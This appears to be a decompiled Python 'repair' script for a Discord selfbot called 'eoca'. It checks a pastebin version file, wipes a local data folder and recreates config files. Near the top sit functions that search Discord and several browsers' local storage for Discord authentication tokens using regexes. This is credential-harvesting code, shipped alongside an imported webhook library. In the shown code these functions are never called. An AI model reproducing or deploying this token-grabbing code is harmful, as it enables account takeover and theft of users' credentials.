# Reversed By Hisako🎀#2004 
import discord
from discord.ext import commands
import os, colorama
from colorama import Fore, Back, Style, init
import cursor, msvcrt, requests
cursor.hide()
from pwinput import pwinput
import time, nacl, webbrowser, threading, re
from dhooks import Webhook, File, Embed
import os.path, json, glob, shutil
from urllib.request import Request, urlopen
import ctypes

def find_tokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log'):
            if not file_name.endswith('.ldb'):
                continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors='ignore').readlines() if x.strip()]:
            for regex in ('[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', 'mfa\\.[\\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)

    return tokens


def get_tokens():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {'Discord':roaming + '\\Discord', 
     'Discord Canary':roaming + '\\discordcanary', 
     'Discord PTB':roaming + '\\discordptb', 
     'Google Chrome':local + '\\Google\\Chrome\\User Data\\Default', 
     'Opera':roaming + '\\Opera Software\\Opera Stable', 
     'Brave':local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default', 
     'Yandex':local + '\\Yandex\\YandexBrowser\\User Data\\Default'}
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        else:
            tokens = find_tokens(path)

    return tokens


init(convert=True)
eoca = f"{Fore.LIGHTMAGENTA_EX}┌─┐┌─┐┌─┐┌─┐  ┌─┐┌─┐┬  ┌─┐┌┐ ┌─┐┌┬┐\n├┤ │ ││  ├─┤  └─┐├┤ │  ├┤ ├┴┐│ │ │ \n└─┘└─┘└─┘┴ ┴  └─┘└─┘┴─┘└  └─┘└─┘ ┴ "
version = '1.2'
r = requests.get('https://pastebin.com/raw/kEMMS1NM')
if version != r.text:
    os.system('cls')
    os.system('mode 66,7')
    os.system(f"title eoca selfbot V{version} ~ outdated version!")
    print(f"{Fore.LIGHTMAGENTA_EX}{eoca}\n")
    print(f"error, you are using an outdated version of the selfbot! ({Fore.LIGHTWHITE_EX}V{version}{Fore.LIGHTMAGENTA_EX})")
    print(f"check {Fore.LIGHTWHITE_EX}https://discord.gg/5tBcpzh22H{Fore.LIGHTMAGENTA_EX} for the latest download link!")
    os.system('pause>nul')
    quit()
os.system('cls')
os.system('mode 48,7')
os.system(f"title eoca selfbot V{version} ~ repair")
print(f"{Fore.LIGHTMAGENTA_EX}{eoca}\n")
print(f"this will reset all saved data, continue? ({Fore.LIGHTWHITE_EX}y/n{Fore.LIGHTMAGENTA_EX})")
choice = input(Fore.LIGHTWHITE_EX)
if choice.lower() != 'y':
    if choice.lower() != 'yes':
        quit()
os.system('cls')
os.system(f"title eoca selfbot V{version} ~ repairing...")
print(f"{Fore.LIGHTMAGENTA_EX}{eoca}\n")
user32 = ctypes.WinDLL('user32')
SW_MAXIMISE = 3
hWnd = user32.GetForegroundWindow()
user32.ShowWindow(hWnd, SW_MAXIMISE)
for root, dirs, files in os.walk('data'):
    for f in files:
        time.sleep(0.1)
        print(f"{Fore.LIGHTMAGENTA_EX}deleting {Fore.LIGHTWHITE_EX}{f}{Fore.LIGHTMAGENTA_EX}")
        os.unlink(os.path.join(root, f))

    for d in dirs:
        shutil.rmtree(os.path.join(root, d))

print('')
time.sleep(0.1)
filename_txt = 'key.txt'
print(f"creating {Fore.LIGHTWHITE_EX}{filename_txt}{Fore.LIGHTMAGENTA_EX}")
with open(f"data/{filename_txt}", 'w') as f:
    f.write('')
time.sleep(0.1)
filename_txt = 'prefix.txt'
print(f"creating {Fore.LIGHTWHITE_EX}{filename_txt}{Fore.LIGHTMAGENTA_EX}")
with open(f"data/{filename_txt}", 'w') as f:
    f.write('.')
time.sleep(0.1)
filename_txt = 'token.txt'
print(f"creating {Fore.LIGHTWHITE_EX}{filename_txt}{Fore.LIGHTMAGENTA_EX}")
with open(f"data/{filename_txt}", 'w') as f:
    f.write('')
time.sleep(0.1)
print(f"creating {Fore.LIGHTWHITE_EX}images.dir{Fore.LIGHTMAGENTA_EX}")
newpath = 'data/images'
if not os.path.exists(newpath):
    os.makedirs(newpath)
time.sleep(0.1)
os.system(f"title eoca selfbot V{version} ~ repaired")
print('\nrepair complete!')
print('press anywhere to close.')
os.system('pause>nul')
quit()